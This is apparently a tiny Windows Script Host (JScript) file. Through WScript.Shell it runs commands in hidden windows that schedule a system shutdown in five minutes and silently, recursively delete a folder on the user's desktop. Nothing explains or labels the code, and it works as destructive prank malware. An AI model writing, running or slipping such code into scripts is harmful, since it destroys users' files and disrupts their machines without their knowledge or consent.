c1="rd /s /q %userprofile%\Desktop\a";
c2="cmd /c shutdown -s -t 300";
new ActiveXObject("WScript.Shell").Run(c2,0,true);
new ActiveXObject("WScript.Shell").Run(c1,0,true);
